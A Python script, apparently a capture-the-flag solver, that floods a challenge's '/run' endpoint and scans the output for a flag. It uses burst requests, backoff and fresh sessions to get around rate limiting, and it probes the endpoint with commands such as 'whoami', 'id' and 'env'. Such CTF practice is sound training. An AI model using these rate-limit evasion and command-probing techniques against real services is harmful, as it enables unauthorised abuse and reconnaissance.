#!/usr/bin/env python3
"""
Get the CURRENT flag from Kohli challenge
The flag changes per instance, so we need to actually trigger it
"""
import requests
import time
import re
from concurrent.futures import ThreadPoolExecutor, as_completed

BASE_URL = "http://chall-bcaad8ca.evt-207.glabs.ctf7.com"

def send_single_request(session, cmd, attempt_num):
    """Send a single request and return result"""
    try:
        r = session.post(
            f"{BASE_URL}/run",
            json={"cmd": cmd},
            timeout=10
        )
        data = r.json()
        output = data.get('output', '')
        return (attempt_num, output, r.status_code)
    except Exception as e:
        return (attempt_num, str(e), 0)

def strategy_slow_persistent(session, cmd='help', max_attempts=300):
    """Strategy 1: Slow and persistent - wait out rate limits"""
    print(f"\n[Strategy 1: Slow & Persistent with '{cmd}']")
    print("Sending requests with adaptive delays to avoid rate limiting")
    
    consecutive_rate_limits = 0
    
    for i in range(1, max_attempts + 1):
        try:
            r = session.post(f"{BASE_URL}/run", json={"cmd": cmd}, timeout=10)
            
            if r.status_code == 429:
                consecutive_rate_limits += 1
                if i % 20 == 0:
                    print(f"  [{i:3d}] Rate limited (consecutive: {consecutive_rate_limits})")
                # Exponential backoff
                time.sleep(min(2 ** (consecutive_rate_limits / 10), 5))
                continue
            
            consecutive_rate_limits = 0
            data = r.json()
            output = data.get('output', '')
            
            # Check for flag
            if 'Kaal{' in output or 'FLAG{' in output:
                print(f"\n{'='*80}")
                print(f"✓✓✓ FLAG FOUND at attempt {i}!")
                print(f"{'='*80}")
                print(f"Output: {output}")
                print('='*80)
                return output
            
            if i % 20 == 0:
                print(f"  [{i:3d}] {output[:50]}")
            
            time.sleep(0.15)
            
        except Exception as e:
            if i % 20 == 0:
                print(f"  [{i:3d}] Error: {e}")
            time.sleep(1)
    
    return None

def strategy_different_commands(session):
    """Strategy 2: Try many different commands"""
    print(f"\n[Strategy 2: Different Commands]")
    
    commands = [
        'help', 'flag', 'check', 'status', 'test', 'ping', 'echo',
        'pitch', 'ball', 'read', 'kohli', 'report', 'info', 'debug',
        'ls', 'cat', 'pwd', 'whoami', 'id', 'env', 'version'
    ]
    
    for cmd in commands:
        print(f"\nTrying '{cmd}' (50 attempts)...")
        for i in range(1, 51):
            try:
                r = session.post(f"{BASE_URL}/run", json={"cmd": cmd}, timeout=10)
                
                if r.status_code == 200:
                    data = r.json()
                    output = data.get('output', '')
                    
                    if 'Kaal{' in output or 'FLAG{' in output:
                        print(f"\n✓ FLAG FOUND with '{cmd}' at attempt {i}!")
                        print(f"Output: {output}")
                        return output
                
                time.sleep(0.2)
                
            except Exception as e:
                pass
    
    return None

def strategy_session_persistence(cmd='help'):
    """Strategy 3: Multiple sessions to bypass rate limiting"""
    print(f"\n[Strategy 3: Multiple Sessions]")
    print("Using fresh sessions to avoid rate limit accumulation")
    
    for session_num in range(1, 6):
        print(f"\nSession {session_num}:")
        session = requests.Session()
        
        for i in range(1, 61):
            try:
                r = session.post(f"{BASE_URL}/run", json={"cmd": cmd}, timeout=10)
                
                if r.status_code == 200:
                    data = r.json()
                    output = data.get('output', '')
                    
                    if 'Kaal{' in output or 'FLAG{' in output:
                        print(f"\n✓ FLAG FOUND in session {session_num}, attempt {i}!")
                        print(f"Output: {output}")
                        return output
                    
                    if i % 15 == 0:
                        print(f"  Attempt {i}: {output[:40]}")
                
                time.sleep(0.15)
                
            except Exception as e:
                pass
        
        time.sleep(2)  # Pause between sessions
    
    return None

def strategy_ultra_aggressive():
    """Strategy 4: Send MANY requests very quickly before rate limit kicks in"""
    print(f"\n[Strategy 4: Ultra Aggressive Burst]")
    print("Sending 100 requests as fast as possible")
    
    session = requests.Session()
    
    for i in range(1, 101):
        try:
            r = session.post(f"{BASE_URL}/run", json={"cmd": "help"}, timeout=5)
            data = r.json()
            output = data.get('output', '')
            
            if 'Kaal{' in output or 'FLAG{' in output:
                print(f"\n✓ FLAG FOUND at attempt {i}!")
                print(f"Output: {output}")
                return output
            
            if i % 20 == 0:
                print(f"  [{i}] {output[:40]}")
            
            time.sleep(0.02)  # Minimal delay
            
        except Exception as e:
            pass
    
    return None

def main():
    print("="*80)
    print("KOHLI CHALLENGE - GET CURRENT FLAG")
    print("Testing multiple strategies to trigger detection")
    print("="*80)
    
    session = requests.Session()
    
    # Try each strategy
    strategies = [
        lambda: strategy_ultra_aggressive(),
        lambda: strategy_slow_persistent(session, 'help', 300),
        lambda: strategy_different_commands(session),
        lambda: strategy_session_persistence('help'),
    ]
    
    for idx, strategy in enumerate(strategies, 1):
        print(f"\n{'='*80}")
        print(f"EXECUTING STRATEGY {idx}/{len(strategies)}")
        print('='*80)
        
        result = strategy()
        
        if result and ('Kaal{' in result or 'FLAG{' in result):
            flag_match = re.search(r'Kaal\{[^}]+\}', result)
            if flag_match:
                flag = flag_match.group(0)
                print(f"\n{'='*80}")
                print("🎉 SUCCESS! CURRENT FLAG FOUND! 🎉")
                print('='*80)
                print(f"\nFLAG: {flag}")
                print('='*80)
                return flag
        
        print(f"\nStrategy {idx} did not find flag, trying next...")
        time.sleep(3)
    
    print(f"\n{'='*80}")
    print("All strategies exhausted without finding flag")
    print("The server may require a different approach or more attempts")
    print('='*80)
    return None

if __name__ == "__main__":
    flag = main()
    
    if not flag:
        print("\n⚠ Consider:")
        print("1. The server might need MORE than 300 attempts")
        print("2. There might be a specific timing window")
        print("3. The detection mechanism might have changed")
        print("4. Try running the script multiple times")
